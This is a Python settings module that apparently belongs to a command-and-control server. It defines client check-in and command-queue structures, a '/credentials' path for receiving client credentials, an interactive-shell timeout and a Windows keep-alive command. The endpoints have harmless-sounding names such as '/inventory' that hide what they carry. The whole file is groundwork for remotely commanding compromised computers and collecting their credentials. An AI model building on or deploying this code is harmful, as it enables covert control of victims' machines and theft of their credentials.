import queue
import threading
from EsHandler import EsHandler

# Server's IP address or hostname
SERVER_IP = 'localhost'

# Server Port
SERVER_PORT = 8080

# Instance of ES_HANDLER will be used to interact with Elasticsearch.
ES_HANDLER = EsHandler("amos-index", "http://localhost:9200")

# Paths used by clients
CMD_REQUEST = "/amos?center="
CWD_RESPONSE = "/inventory"
RESPONSE = "/inventory"
CMD_RESPONSE = "/inventory"
CLIENT_CREDENTIALS = "/credentials"
RESPONSE_KEY = "index"          # POST variable name for command output

# Timeout values (in seconds)
CLIENT_ALIVE_TIMEOUT = 30       # How long since last check-in to consider client alive
COMMAND_RESPONSE_TIMEOUT = 20   # How long to wait for a command response in interactive shell

# Keep-alive command sent when no command is pending
KEEP_ALIVE_CMD = "time /T"      # Windows; for Linux use "date"

# Shared data structures (thread-safe)
CONNECTED_CLIENTS = {}           # client_id -> {'display': 'user@host', 'last_seen': float, 'ip': str}
client_lock = threading.RLock()  # Protects CONNECTED_CLIENTS

# Command queue: (client_id, command, cmd_id)
command_queue = queue.Queue()

# Response storage: cmd_id -> response_string
response_storage = {}
response_lock = threading.RLock()

CERT_FILE = "cert.pem"
KEY_FILE = "key.pem"


# Global command ID counter
cmd_counter = 0
cmd_counter_lock = threading.Lock()

def get_next_cmd_id():
    global cmd_counter
    with cmd_counter_lock:
        cmd_counter += 1
        return cmd_counter